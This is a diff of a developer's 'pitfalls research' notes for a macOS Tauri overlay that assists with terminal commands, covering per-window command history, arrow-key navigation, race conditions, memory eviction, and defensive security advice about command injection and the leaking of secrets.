+If the window key (bundle_id + TTY) is computed lazily inside `get_app_context` after the overlay has already shown and stolen focus, there is a race between the overlay appearing and the TTY lookup completing. If the user triggers Cmd+K from Window A, quickly switches to Window B before context detection finishes, the TTY resolved is Window B's but the event was triggered by Window A. The history assigned will belong to the wrong window.
+
+**Why it happens:**
+The existing "capture-before-show" pattern correctly captures `previous_app_pid` synchronously in the hotkey handler before `show_and_make_key()`. The window key must be captured with the same synchronicity. Any TTY lookup that forks a subprocess (`lsof`, `pgrep`) can take 50-200ms -- long enough for a context switch to occur.
+
+**How to avoid:**
+Compute the complete window key synchronously in the hotkey handler at the same point `previous_app_pid` is captured:
+
+```rust
+// In hotkey handler (before show_and_make_key):
+let previous_pid = get_frontmost_pid();
+let shell_pid = find_shell_pid_fast(previous_pid); // direct proc walk, no subprocesses
+let window_key = compute_tty_key(previous_pid, shell_pid); // proc_pidinfo only
+state.previous_window_key = Mutex::new(Some(window_key));
+// THEN call show_and_make_key()
+```
+
+Use only `proc_pidinfo` with `PROC_PIDTBSDINFO` for TTY extraction -- this is a kernel syscall bounded to microseconds. Do not use `lsof` or `pgrep` in the key computation path.
+
+**Warning signs:**
+- On fast Cmd+K sequences (open from Window A, close, quickly open again from Window B), history from A appears in B
+- History map shows keys that don't match the currently active terminal's TTY
+- Race is intermittent and only reproducible under speed stress
+
+**Phase to address:**
+Phase 1 (window identification). Test with rapid alternating Cmd+K from two different terminal windows.
+
+---
+
+### Pitfall 8: History Navigation Draft Loss -- No Draft Cache on ArrowUp
+
+**What goes wrong:**
+User types a multi-word query ("list all docker containers sorted by size"), then accidentally presses ArrowUp to navigate history. The draft is replaced by a history entry. Pressing ArrowDown to return does not restore the original draft -- it was discarded.
+
+**Why it happens:**
+A naive history navigation implementation sets `inputValue` directly to the history entry without saving the current draft. Standard shell history navigation (bash/zsh) caches the current buffer and restores it on ArrowDown past the end of history -- but this behavior is not automatic.
+
+**How to avoid:**
+Cache the unsaved draft when navigation begins:
+
+```typescript
+const [historyDraft, setHistoryDraft] = useState<string | null>(null);
+const [historyIndex, setHistoryIndex] = useState<number>(-1);
+
+function navigateHistory(direction: -1 | 1) {
+  if (direction === -1 && historyIndex === -1) {
+    // Save draft before navigating away
+    setHistoryDraft(inputValue);
+  }
+  const newIndex = historyIndex + direction;
+  if (newIndex < -1) return; // Already at end
+  if (newIndex >= history.length) return; // Already at oldest
+  if (newIndex === -1) {
+    // Restore draft
+    setInputValue(historyDraft ?? "");
+    setHistoryDraft(null);
+  } else {
+    setInputValue(history[newIndex]);
+  }
+  setHistoryIndex(newIndex);
+}
+```
+
+**Warning signs:**
+- Users report losing typed queries when accidentally pressing ArrowUp
+- ArrowDown at the end of history shows empty input instead of the original draft
+
+**Phase to address:**
+Phase 2 (arrow key navigation). This is part of the correct history UX, not an edge case.
+
+---
+
+## Technical Debt Patterns
+
+Shortcuts that seem reasonable but create long-term problems.
+
+| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
+|----------|-------------------|----------------|-----------------|
+| Key on PID alone (no TTY) | No change to AppState shape, works for single-window usage | History bleeds across iTerm2 tabs; cross-window contamination on PID reuse | Never -- TTY-based key is cheap to implement from the start |
+| Store history in Zustand only | No Rust changes needed | History wiped on every overlay open; invisible to Rust-side context building | Never -- backend storage is needed for durability |
+| No eviction policy on history map | Simpler code | Memory leak for long-running daemon in heavy-use environments | Acceptable in v0.1.1 only if a hard max_entries cap (20) is enforced |
+| Include full terminal context in every history turn | Simpler `build_user_message` | Token bloat at follow-up 3+; rate limit risk | Never -- first-turn-only context is trivially implementable |
+| Arrow-up always navigates history (no line check) | Simple 5-line implementation | Breaks multi-line input cursor movement | Never -- line-position check is 5 lines of code |
+| Prefix-search history on arrow-up (bash-style) | More polish | Conflicts with simple index-based navigation; adds complexity | Defer to v0.2 -- plain up/down is sufficient for v0.1.1 |
+
+---
+
+## Integration Gotchas
+
+Common mistakes when connecting history to existing components.
+
+| Integration | Common Mistake | Correct Approach |
+|-------------|----------------|------------------|
+| xAI history replay | Including terminal context fields in every historical user message | Context goes only in the first user message of the session; subsequent turns send bare query text |
+| `proc_pidinfo` PROC_PIDTBSDINFO | Treating `pbi_tdev` directly as a path string | `pbi_tdev` is a device number (major/minor encoded); resolve via `devname_r()` or match against `/dev/ttys*` entries |
+| Tauri `AppState` Mutex | Holding the lock across `await` points | Hold `Mutex` guard only for map read/write; drop before any `await`; or use `tokio::sync::Mutex` for async-native locking |
+| Zustand `show()` reset | Adding history fields to AppState and forgetting to exclude them from the show() reset | Keep window history in Rust backend; only fetch the relevant window's history into a local variable on show() |
+| Arrow key `e.preventDefault()` | Calling it unconditionally in textarea `onKeyDown` | Gate on cursor line position (see Pitfall 3); only prevent default when actually navigating history |
+| History turn trimming | Trimming from the newest end | Always trim from the oldest end (index 0); preserve the most recent N turns for coherent follow-up |
+| Liveness check in history fetch | Calling `get_process_name` with a stale PID during context detection race | Capture shell PID in the hotkey handler and store it alongside the window key |
+
+---
+
+## Performance Traps
+
+Patterns that work at small scale but fail as usage grows.
+
+| Trap | Symptoms | Prevention | When It Breaks |
+|------|----------|------------|----------------|
+| TTY device lookup using `lsof` in hotkey handler | 50-200ms added to overlay open latency; perceptible delay before overlay appears | Use `proc_pidinfo(PROC_PIDTBSDINFO)` only -- kernel syscall, no subprocess | Every hotkey trigger if `lsof` is in the synchronous path |
+| History map Mutex held across `await` points | Deadlock or very long lock hold times; other Tauri commands block waiting for the mutex | Hold Mutex guard only for map read/write; drop before any async operation | First time a second Tauri command fires while history update is in-flight |
+| Large `visible_output` in all history turns | API call latency grows 2-5x by follow-up 3-4 | Strip terminal context from history replay; context is first-turn-only | Follow-up query 3 or beyond in a verbose terminal session |
+| `HashMap::clear()` not releasing memory | App RSS stays high after many terminal tabs are opened and closed | Call `map.shrink_to_fit()` after bulk removal, or use entry-by-entry `remove()` | After a session where 30+ terminal tabs were opened then closed |
+
+---
+
+## Security Mistakes
+
+Domain-specific security issues for the history feature.
+
+| Mistake | Risk | Prevention |
+|---------|------|------------|
+| Persisting conversation history to disk (e.g., JSON file) | Terminal output may contain secrets (API keys, passwords from `cat .env`); disk persistence makes them recoverable | Keep history in-process only (Rust AppState); never persist to disk in v0.1.1 |
+| Including full shell history from `~/.zsh_history` in AI context | Sends sensitive command sequences to xAI API without user awareness | Use only the current session's overlay-generated history, never the shell's own history file |
+| Logging full history turns via `eprintln!` in production builds | Conversation content with potential secrets appears in system logs | Gate verbose history logging behind `#[cfg(debug_assertions)]` |
+
+---
+
+## UX Pitfalls
+
+| Pitfall | User Impact | Better Approach |
+|---------|-------------|-----------------|
+| No visual indicator that history navigation is available | User does not know ArrowUp history exists; feature is invisible | Show a subtle indicator (e.g., small arrow hint or turn count) in the overlay footer when history length > 0 |
+| History navigation changes input immediately with no way to undo | User accidentally navigates to a long previous command and cannot get back to their draft | Cache the unsaved draft on first ArrowUp press; restore it on ArrowDown past end (Pitfall 8) |
+| Follow-up context shows stale CWD from a previous session's history | User opens overlay from a new directory; AI responds as if in the old directory | Always refresh context on overlay open by re-running `get_app_context`; never use cached context from history turns as the current context |
+| Arrow navigation wraps around (oldest entry goes back to newest) | User presses ArrowUp past oldest entry and ends up at newest entry; disorienting | Do not wrap; clamp at oldest entry (ArrowUp has no effect when at oldest) and at draft (ArrowDown has no effect when at draft) |
+
+---
+
+## "Looks Done But Isn't" Checklist
+
+- [ ] **Window identification:** Works with single iTerm2 window -- verify it also isolates history between TWO simultaneously open iTerm2 windows with different CWDs
+- [ ] **Arrow navigation:** Works at a single-line prompt -- verify ArrowUp does NOT intercept cursor movement when on line 2 of a Shift+Enter multi-line input
+- [ ] **History persistence:** History survives overlay dismiss/reopen -- verify it is EMPTY for a brand-new terminal tab in the same app
+- [ ] **Follow-up context:** AI receives correct history -- verify Rust-side API payload size does NOT grow linearly with terminal output size after 3 turns
+- [ ] **GPU terminal fallback:** History isolated correctly for iTerm2 -- verify Alacritty (no AX/TTY) falls back to app-scoped key gracefully, not a crash
+- [ ] **Reset-on-show integrity:** History persists -- verify ALL other ephemeral state (streamingText, isDestructive, displayMode) still resets correctly on show()
+- [ ] **Rapid Cmd+K:** Window key correct under speed stress -- verify no TOCTOU race by alternating Cmd+K from two different terminal windows in quick succession
+- [ ] **Draft preservation:** ArrowUp and back down restores the original unsaved draft, not an empty string
+
+---
+
+## Recovery Strategies
+
+When pitfalls occur despite prevention, how to recover.
+
+| Pitfall | Recovery Cost | Recovery Steps |
+|---------|---------------|----------------|
+| PID-only key discovered after history UI is built | HIGH | Refactor AppState key type from `i32` to `String`; update all callers of history map; re-test all history scenarios |
+| History stored in Zustand (wiped on show) | HIGH | Migrate to backend HashMap; add `get_window_history` and `update_window_history` Tauri commands; update frontend to call them on show() and after each turn |
+| No eviction causing memory growth | LOW | Add `evict_stale()` call on each history update; no API surface change required |
+| Terminal context in all history turns (token bloat) | MEDIUM | Refactor `build_user_message` to detect first vs. follow-up turn; no state change required, only logic in `ai.rs` |
+| Arrow key eating multi-line cursor movement | LOW | Add `isOnFirstLine`/`isOnLastLine` guards to existing `handleKeyDown`; localized to `CommandInput.tsx` |
+| Draft loss on ArrowUp | LOW | Add `historyDraft` and `historyIndex` state; cache draft on first navigation; restore on ArrowDown past end |
+
+---
+
+## Pitfall-to-Phase Mapping
+
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| PID alone as window key | Phase 1: Window identification | Test two simultaneously open iTerm2 windows; verify separate histories |
+| PID reuse corrupting history | Phase 1: Window identification | Close a terminal tab; verify liveness check evicts the stale entry |
+| History in Zustand wiped on show | Phase 1: History storage architecture | Verify history survives 5 overlay open/close cycles |
+| Unbounded map growth | Phase 1: History storage architecture | Simulate 100 window events; verify map size stays at or below cap |
+| Window key computed after overlay shows | Phase 1: Window identification | Rapid alternating Cmd+K test between two terminal windows |
+| Arrow key vs. multi-line cursor | Phase 2: Arrow key navigation | ArrowUp on line 2 of Shift+Enter multi-line prompt does not navigate history |
+| Draft loss on ArrowUp | Phase 2: Arrow key navigation | ArrowUp then ArrowDown restores the original draft |
+| Token bloat in follow-up context | Phase 3: AI follow-up context | Log API payload size for turns 1-5; verify no linear growth with terminal output |
+
+---
+
+## v0.1.0 Foundation Pitfalls
+
+These remain applicable and are preserved from the original research (February 21, 2026). They are already resolved in the shipped v0.1.0 code.
+
+### Pitfall 9: Sandboxing Incompatible with Accessibility API
+
+**What goes wrong:** You cannot use the macOS Accessibility API from a sandboxed app. If sandboxing is enabled (required for App Store distribution), terminal state reading and paste into other apps both fail.
+
+**Prevention:** DO NOT enable `com.apple.security.app-sandbox`. Use Developer ID distribution (notarization only). Already resolved in v0.1.0.
+
+**Phase to address:** Resolved. Foundation phase.
+
+---
+
+### Pitfall 10: AppleScript Command Injection via Unsanitized AI Responses
+
+**What goes wrong:** AI responses containing backticks or semicolons interpolated directly into AppleScript `do script` commands allow arbitrary terminal command execution.
+
+**Prevention:** Never directly interpolate AI responses into AppleScript strings. Escape properly or use temp file intermediary. Already resolved in v0.1.0 with the paste-not-execute approach.
+
+**Phase to address:** Resolved. Terminal integration phase.
+
+---
+
+### Pitfall 11: Transparent Window Rendering Glitches on macOS Sonoma
+
+**What goes wrong:** Transparent Tauri windows exhibit visual artifacts after focus changes on Sonoma with Stage Manager.
+
+**Prevention:** Set `ActivationPolicy::Accessory` before any window operations. Already resolved in v0.1.0 (`lib.rs` line 55).
+
+**Phase to address:** Resolved. Foundation phase.
+
+---
+
+### Pitfall 12: Global Hotkey Cmd+K Fires Twice on macOS
+
+**What goes wrong:** Tauri global-shortcut plugin bug (#10025) causes double-fire of hotkey events.
+
+**Prevention:** 200ms debounce via `last_hotkey_trigger` timestamp in AppState. Already resolved in v0.1.0.
+
+**Phase to address:** Resolved. Foundation phase.
+
+---
+
+### Pitfall 13: Accessibility Permissions Silently Fail Without Prompting User
+
+**What goes wrong:** macOS Accessibility requires manual user action in System Settings; no automatic prompt. Failures are silent.
+
+**Prevention:** AX probe fallback for permission detection; onboarding wizard guides user. Already resolved in v0.1.0.
+
+**Phase to address:** Resolved. Foundation phase.
+
+---
+
+### Pitfall 14: Non-Focusable Windows Still Steal Focus on macOS
+
+**What goes wrong:** `focusable: false` does not work on macOS in Tauri v2.
+
+**Prevention:** Use NSPanel (tauri-nspanel) with `nonactivating_panel` style mask and `can_become_key_window: true`. Already resolved in v0.1.0.
+
+**Phase to address:** Resolved. Foundation phase.
+
+---
+
+### Pitfall 15: Streaming xAI Responses Cause IPC Performance Bottleneck
+
+**What goes wrong:** Streaming large AI responses through Tauri commands causes UI lag and high CPU if not chunked properly.
+
+**Prevention:** Use Tauri IPC Channel for streaming; forward individual tokens as they arrive. Already resolved in v0.1.0 (`stream_ai_response` in `ai.rs`).
+
+**Phase to address:** Resolved. AI integration phase.
 
 ---
 
@@ -664,69 +456,28 @@ Mistakes that cause annoyance but are fixable without major refactoring.
 
 | Phase Topic | Likely Pitfall | Mitigation |
 |-------------|---------------|------------|
-| Phase 1: Window Setup | Transparent window glitches on focus change | Set activation policy to Accessory immediately |
-| Phase 1: Hotkey Registration | Cmd+K conflicts with popular apps | Build configurable hotkey system from start |
-| Phase 1: Permissions | Accessibility permission flow unclear to users | Create onboarding wizard with permission guide |
-| Phase 2: Terminal Detection | Hardcoded terminal app list | Use process-based detection + user override |
-| Phase 2: AppleScript Integration | Command injection from AI responses | Implement sanitization before any terminal execution |
-| Phase 3: xAI Streaming | IPC performance bottleneck | Use Tauri events with chunked streaming |
-| Phase 4: Distribution | Notarization hangs or fails | Use App Store Connect API, test early |
-| Phase 4: Distribution | Sandboxing breaks accessibility | DO NOT enable sandboxing, use Developer ID |
-
----
-
-## macOS Version-Specific Issues
-
-| macOS Version | Known Issue | Impact | Workaround |
-|---------------|-------------|--------|------------|
-| Sonoma 14.0+ | Transparent window rendering glitches with Stage Manager | Critical | Set ActivationPolicy::Accessory |
-| Ventura 13.0+ | Accessibility permissions spontaneously revoke between boots | Moderate | Detect and re-prompt on each launch |
-| Monterey 12.0+ | Global shortcuts may fail silently | Moderate | Verify registration success, provide fallback |
-
----
-
-## Distribution Checklist
-
-Before releasing:
-
-- [ ] Accessibility permissions granted during testing (manually in System Settings)
-- [ ] Sandboxing is DISABLED (confirmed in entitlements.plist)
-- [ ] Entitlements include `com.apple.security.automation.apple-events`
-- [ ] All AppleScript string interpolation sanitized
-- [ ] Global hotkey conflicts tested with Safari, VS Code, Slack
-- [ ] Transparent window tested on Sonoma with Stage Manager enabled
-- [ ] Activation policy set to Accessory (if menu bar app)
-- [ ] Menu bar icons include @2x and @3x variants
-- [ ] Notarization tested with actual Apple credentials (not dry-run)
-- [ ] Security audit completed for command injection vectors
-- [ ] IPC streaming performance tested with large AI responses
-- [ ] Terminal detection tested with iTerm2, Warp, Terminal.app minimum
+| Phase 1: Window identification | Using app PID as map key | Compute bundle_id + TTY composite key synchronously in hotkey handler |
+| Phase 1: History storage | Zustand state wiped on show | Store history in Rust AppState HashMap, fetch on overlay open |
+| Phase 1: History storage | Unbounded map growth | Enforce cap + LRU eviction from the start |
+| Phase 2: Arrow key navigation | Multi-line input cursor conflict | Gate ArrowUp/Down on cursor line position |
+| Phase 2: Arrow key navigation | Draft loss on accidental navigation | Cache draft before first ArrowUp; restore on ArrowDown past end |
+| Phase 3: AI follow-up context | Token bloat at follow-up 3+ | Context in first user message only; character-count secondary cap on history |
+| Phase 3: AI follow-up context | Stale context in follow-up | Re-run `get_app_context` on every overlay open; never use history-embedded context as current context |
 
 ---
 
 ## Sources
 
-**Official Documentation:**
-- [Tauri v2 Documentation](https://v2.tauri.app/)
-- [Tauri macOS Code Signing](https://v2.tauri.app/distribute/sign/macos/)
-- [Tauri Window Customization](https://v2.tauri.app/learn/window-customization/)
-- [Tauri Global Shortcut Plugin](https://v2.tauri.app/plugin/global-shortcut/)
-- [Apple Shell Script Security](https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/ShellScriptSecurity/ShellScriptSecurity.html)
-- [Apple Support: Accessibility Permissions](https://support.apple.com/guide/mac-help/allow-accessibility-apps-to-access-your-mac-mh43185/mac)
+- Codebase review: `src-tauri/src/state.rs`, `src-tauri/src/commands/terminal.rs`, `src-tauri/src/terminal/process.rs`, `src-tauri/src/terminal/ax_reader.rs`, `src/store/index.ts`, `src/hooks/useKeyboard.ts`, `src/components/CommandInput.tsx`, `src-tauri/src/commands/ai.rs`
+- macOS process API: [proc_pidinfo library (mmastrac)](https://github.com/mmastrac/proc_pidinfo), [macOS PID reuse (HackTricks)](https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-connecting-process-check/macos-pid-reuse.html)
+- macOS window identification: [GetWindowID utility (smokris)](https://github.com/smokris/GetWindowID), [iTerm2 Variables documentation](https://iterm2.com/documentation-variables.html)
+- TTY session identification: [The TTY demystified (Linus Akesson)](https://www.linusakesson.net/programming/tty/)
+- LLM context management: [Context Window Management Strategies (getmaxim.ai)](https://www.getmaxim.ai/articles/context-window-management-strategies-for-long-context-ai-agents-and-chatbots/), [LLM performance degradation at context limits](https://demiliani.com/2025/11/02/understanding-llm-performance-degradation-a-deep-dive-into-context-window-limits/)
+- xAI Grok token limits: [xAI Models and Pricing](https://docs.x.ai/developers/models), [Grok 3 context window analysis](https://www.byteplus.com/en/topic/568342)
+- Tauri state management: [Tauri v2 State Management docs](https://v2.tauri.app/develop/state-management/), [Tauri HashMap state discussion](https://github.com/tauri-apps/tauri/discussions/7279)
+- Rust HashMap memory: [Handling memory leaks in Rust (LogRocket)](https://blog.logrocket.com/handling-memory-leaks-rust/)
+- Arrow key in React textarea: [stopPropagation for input navigation (DEV Community)](https://dev.to/rajeshroyal/practical-use-of-the-eventstoppropagation-react-mui-data-grid-allowing-arrow-key-navigation-for-571a)
 
-**Tauri GitHub Issues:**
-- [Issue #8255: Transparent window glitch on macOS Sonoma](https://github.com/tauri-apps/tauri/issues/8255)
-- [Issue #9503: Cannot drag window with Overlay titleBarStyle](https://github.com/tauri-apps/tauri/issues/9503)
-- [Issue #14102: Focusable: false broken on macOS](https://github.com/tauri-apps/tauri/issues/14102)
-- [Issue #10025: Global shortcut fires twice on macOS](https://github.com/tauri-apps/tauri/issues/10025)
-- [Issue #13034: NSPanel window type feature request](https://github.com/tauri-apps/tauri/issues/13034)
-- [Discussion #3138: Streaming response body](https://github.com/orgs/tauri-apps/discussions/3138)
-
-**Security Research:**
-- [ClickFix macOS Campaign: AppleScript Phishing](https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing)
-- [MITRE ATT&CK: AppleScript T1059.002](https://attack.mitre.org/techniques/T1059/002/)
-- [Intego: Matryoshka ClickFix Variant](https://www.intego.com/mac-security-blog/matryoshka-clickfix-macos-stealer/)
-
-**Community Resources:**
-- [GitHub: tauri-plugin-macos-permissions](https://github.com/ayangweb/tauri-plugin-macos-permissions)
-- [Apple Developer Forums: Sandboxed Accessibility](https://developer.apple.com/forums/thread/810677)
+---
+*Pitfalls research for: per-terminal-window command history and AI follow-up context (Tauri v2 macOS overlay, v0.1.1 milestone)*
+*Researched: 2026-02-28*
